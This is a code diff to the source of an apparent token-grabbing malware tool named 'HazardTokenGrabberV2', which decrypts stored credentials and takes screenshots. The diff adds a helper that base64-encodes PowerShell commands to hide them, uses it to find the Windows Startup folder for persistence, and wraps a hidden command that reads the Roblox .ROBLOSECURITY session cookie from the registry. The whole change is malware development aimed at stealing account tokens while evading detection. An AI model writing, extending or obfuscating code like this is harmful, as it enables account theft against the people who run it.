@@ -16,7 +16,7 @@ import subprocess
 
 from sys import argv
 from PIL import ImageGrab
-from base64 import b64decode
+from base64 import b64encode, b64decode
 from Crypto.Cipher import AES
 from tempfile import mkdtemp, gettempdir
 from win32crypt import CryptUnprotectData
@@ -181,6 +181,10 @@ class Functions(object):
     def fetch_conf(e: str) -> str or bool | None:
         return __config__.get(e)
 
+    @staticmethod
+    def powershell_encode(a: str):
+        return "powershell -encodedCommand " + b64encode(a.encode("utf-16-le")).decode()
+
 
 class HazardTokenGrabberV2(Functions):
     def __init__(self):
@@ -193,7 +197,7 @@ class HazardTokenGrabberV2(Functions):
         inf, net = self.system_info(), self.network_info()
         self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
         self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]
-        self.startup_loc = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        self.startup_loc = subprocess.check_output(self.powershell_encode("[System.Environment]::GetFolderPath(7)")).decode().rstrip()
 
         self.hook_reg = "api/webhooks"
         self.chrome_reg = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
@@ -553,7 +557,7 @@ class HazardTokenGrabberV2(Functions):
         def subproc(path):
             try:
                 return subprocess.check_output(
-                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
+                    self.powershell_encode(fr"Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY"),
                     creationflags=0x08000000).decode().rstrip()
             except Exception:
                 return None
